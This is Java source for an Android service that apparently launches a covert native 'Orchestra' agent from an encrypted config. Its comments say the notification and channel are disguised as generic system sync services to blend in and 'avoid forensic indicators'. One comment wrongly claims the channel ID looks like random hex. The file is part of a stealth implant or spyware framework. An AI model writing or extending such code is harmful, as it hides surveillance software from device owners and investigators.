package com.orchestra;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

/**
 * Foreground service that hosts the Orchestra agent.
 *
 * <p>Loads liborchestra.so, calls nativeInit() with the encrypted config, then nativeStart()
 * to spawn the agent loop.  Runs as a foreground service with a persistent notification
 * to satisfy Android's background execution limits (Android 8.0+).
 */
public class AgentService extends Service {
    private static final String TAG = "OrchestraAgent";
    private static final String CHANNEL_ID = "orchestra_agent_channel";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "AgentService created");
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "AgentService starting...");

        // Build a minimal foreground notification using system-style strings
        // that blend in with standard Android system services.
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(android.R.string.unknownName))
                .setContentText("Syncing data\u2026")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .setPriority(Notification.PRIORITY_MIN)
                .setOngoing(false)
                .build();

        startForeground(NOTIFICATION_ID, notification);

        // Load encrypted config from intent or asset.
        // For now, use a placeholder empty config.
        byte[] configBytes = new byte[0];
        if (intent != null && intent.hasExtra("config")) {
            configBytes = intent.getByteArrayExtra("config");
        }

        // Initialize and start the native agent.
        int initResult = Agent.nativeInit(configBytes);
        if (initResult != 0) {
            Log.e(TAG, "Agent.nativeInit() returned " + initResult);
            stopSelf();
            return START_NOT_STICKY;
        }

        int startResult = Agent.nativeStart();
        if (startResult != 0) {
            Log.e(TAG, "Agent.nativeStart() returned " + startResult);
            stopSelf();
            return START_NOT_STICKY;
        }

        Log.i(TAG, "Agent started successfully");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "AgentService destroying, stopping agent...");
        Agent.nativeStop();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service.
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Use generic channel name and description to avoid forensic
            // indicators.  The channel ID is a random-looking hex string
            // that doesn't resemble "orchestra".
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Sync",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Background synchronization");
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
}